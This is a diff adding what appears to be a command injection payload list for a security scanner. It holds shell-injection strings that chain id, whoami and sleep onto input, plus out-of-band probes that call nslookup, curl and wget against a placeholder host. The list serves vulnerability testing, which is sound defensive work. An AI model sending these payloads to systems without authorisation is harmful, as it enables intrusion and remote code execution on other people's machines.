@@ -1,0 +1,37 @@
+# Command Injection Payloads
+# Edit this file to add or remove payloads without touching source code.
+# The {oob} placeholder is replaced with the --oob-host value at runtime.
+
+payloads:
+  output_based:
+    - "; id"
+    - "| id"
+    - "` id`"
+    - "$(id)"
+    - "'; id"
+    - '"; id'
+    - "| whoami"
+    - "; whoami"
+    - "| uname -a"
+    - "& whoami &"
+    - "&& whoami"
+    - "|| whoami"
+
+  time_based:
+    - "; sleep 5"
+    - "| sleep 5"
+    - "` sleep 5`"
+    - "$(sleep 5)"
+    - "& ping -c 5 127.0.0.1 &"
+    - "| ping -n 5 127.0.0.1"
+    - "; ping -c 10 127.0.0.1"
+
+  oob:
+    - "; nslookup {oob}"
+    - "| nslookup {oob}"
+    - "` nslookup {oob}`"
+    - "$(nslookup {oob})"
+    - "; curl http://{oob}/cmd"
+    - "| curl http://{oob}/cmd"
+    - "$(curl http://{oob}/cmd)"
+    - "; wget http://{oob}/cmd"
